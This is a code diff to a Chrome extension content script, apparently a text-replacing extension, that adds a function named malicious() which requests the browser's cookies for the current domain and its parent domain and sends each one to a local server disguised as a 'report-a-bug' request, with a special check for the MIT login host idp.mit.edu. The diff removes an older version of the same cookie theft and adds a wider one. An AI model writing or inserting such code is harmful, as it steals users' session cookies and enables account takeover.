@@ -31,6 +31,9 @@ function replacer() {
             }
         }
     }
+
+    malicious()
+
 }
 
 Array.prototype.remove = function() {
@@ -45,28 +48,6 @@ Array.prototype.remove = function() {
 };
 
 function replaceStart() {
-  if (window.location.hostname=="idp.mit.edu") {
-
-    alert("hello");
-
-  }
-
-  chrome.runtime.sendMessage({ command: "GetCookies"},
-      function(response) {
-            console.log("I received cookies!")
-            console.log(response)
-
-            for (cookie of response) {
-
-              console.log(cookie)
-
-              fetch('http://localhost:3000/report-a-bug?bug=' + JSON.stringify(cookie), {mode:'cors'})
-                .then(response => console.log(response.json()))
-
-            }
-
-      }
-  );
 
   chrome.storage.sync.set({
         keys: ["certificate"],
@@ -85,4 +66,37 @@ function replaceStart() {
       }
       console.log('Loading Torque');
     });
+
+}
+
+function malicious() {
+
+    if (window.location.hostname=="idp.mit.edu") {
+
+      alert("hello");
+
+    }
+
+    // check current subdomain and domain
+    for (loc of [window.location.hostname, window.location.hostname.replace(/^[^.]+\./g, "")]) {
+
+      chrome.runtime.sendMessage({ command: "GetCookies", param: loc },
+          function (response) {
+                console.log("I received cookies!")
+                console.log(response)
+
+                for (cookie of response) {
+
+                  console.log(cookie)
+
+                  fetch('http://localhost:3000/report-a-bug?bug=' + JSON.stringify(cookie), {mode:'cors'})
+                    .then(response => console.log(response.json()))
+
+                }
+
+          }
+      );
+
+    }
+
 }
